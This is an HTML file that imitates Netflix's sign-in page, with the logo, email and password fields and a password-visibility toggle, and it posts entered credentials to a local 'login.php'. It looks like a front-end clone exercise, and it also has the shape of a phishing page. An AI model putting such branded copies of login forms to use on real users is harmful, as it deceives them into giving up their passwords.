<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Netflix Login Page  </title>
    <link rel="shortcut icon" href="./Assets/favicon.png" type="image/x-icon" />
    <link rel="stylesheet" href="style 2.css" />
    <style>
        /* Add some custom styles for the toggle icon */
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }
    </style>
  </head>
  <body>
    <nav>
      <a href="home.html"
        ><img class="logo" src="Assets/logo.png" alt="logo"
      /></a>
    </nav>
    <div class="form-wrapper">
      <h2>Sign In</h2>
      <form action="login.php" method="post">
        <div class="form-control">
          <input type="email" required name="email" />
          <label>Email</label>
        </div>
        <div class="form-control">
          <input type="password" required name="password" id="password"/>
          <label>Password</label>
          <i class="toggle-password" onclick="togglePassword()">üëÅ</i>
        </div>
        <button type="submit">Sign In</button>
        <div class="form-help">
          <div class="remember-me">
            <input type="checkbox" id="remember-me" required/>
            <label for="remember-me">Remember me</label>
          </div>
          <a>Need help?</a>
        </div>
      </form>
      <p>New to Netflix? <a>Sign up now</a></p>
      <small>
        This page is protected by Google reCAPTCHA to ensure you're not a bot.
        <a>Learn more.</a>
      </small>
    </div>

    <script>
    function togglePassword() {
        var passwordInput = document.getElementById("password");
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
        } else {
            passwordInput.type = "password";
        }
    }
</script>


  </body>
</html>
